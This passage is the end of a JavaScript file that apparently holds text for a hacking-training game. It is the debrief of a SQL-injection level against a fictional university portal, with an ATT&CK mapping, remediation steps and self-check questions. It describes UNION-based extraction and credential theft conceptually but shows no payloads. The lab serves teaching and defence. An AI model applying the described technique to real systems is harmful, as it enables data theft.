  NIST SP 800-53 SI-10 (Information Input Validation) is the
  control; parameterized queries are the fix, and a WAF is not
  one.

  FERPA is the regime, and it carries NO breach-notification
  duty and no fine schedule. Enforcement runs through the
  Department of Education's funding-withdrawal authority and the
  annual FSA attestation. Any notification clock here comes from
  STATE law attaching to the PII. Two exposures, two timelines.

─── MITRE ATT&CK MAPPING ─────────────────────────────────────

  T1190     — Exploit Public-Facing Application. The injection itself.
  T1213     — Data from Information Repositories. The portal database
              you read through the UNION.
  T1552     — Unsecured Credentials. The plaintext DB credential in the
              app_config table.
  T1078     — Valid Accounts. What an attacker does next with the
              \`meridian_dbadmin\` credential you extracted.

─── WHAT A DEFENDER SHOULD ACTUALLY DO ───────────────────────

  1. Parameterize the query. Prepared statements / bound parameters,
     every query, no exceptions. This closes the injection completely.
  2. Scope the database account. Give the public catalog a read-only
     user that can see \`courses\` and nothing else. Defense in depth: if
     an injection ever lands again, it reaches nothing.
  3. Stop leaking errors. Return a generic 500 to clients; log the
     detail server-side. Never echo the query or the DB version.
  4. Rotate the exposed credential. Treat \`meridian_dbadmin\` as burned.
     Move it out of the database into a secrets manager; never store
     credentials in an application table.
  5. Put the subdomain behind the WAF and add rate limiting. A WAF is
     not a fix for injection — parameterizing is — but it buys time and
     catches the noisy automated scanners (sqlmap) that find these.
  6. Upgrade off MySQL 5.7 (end-of-life October 2023; no security
     patches since). An unpatched database under a public injection is a
     compounding risk.
  7. Scan for the pattern everywhere. The "glue input into SQL" shape
     repeats; Semgrep and CodeQL both ship SQL-injection rule packs.
     Find every query built by concatenation, not just this one.

─── CHECK YOURSELF ───────────────────────────────────────────

Before you move on, see if you can answer these without
scrolling back. If one stalls you, that's the part worth
re-reading.

  1. No authentication is required here. What does that change
     about who the attacker population is?

  2. You parameterize the query this afternoon. What is still
     wrong tomorrow morning?

  3. Priya said prove reach and stop. What separates proof from
     harm in this specific case?

─── GO DEEPER ────────────────────────────────────────────────

  https://www.d3cyph3r.com/walkthroughs/web/level2.html

The walkthrough covers the full control mapping, the
certification objectives, UNION-based extraction step by step,
the real-world SQLi breaches, and a Sigma rule for injection
patterns and verbose database errors.

From the terminal:    walkthrough

─── CLOSING THOUGHT ──────────────────────────────────────────

sqlmap would have done in one command what you did by hand here. Doing
it by hand once is why you understand what the tool is doing — the quote
that breaks the string, the UNION that matches the column count, the
information_schema that maps the database. The defense never changes:
the database must treat user input as a value, never as code. One bound
parameter would have made this whole engagement a 404.

Return to the lobby:    ssh guest@d3cyph3r`
        },

      },
    },
  },

};
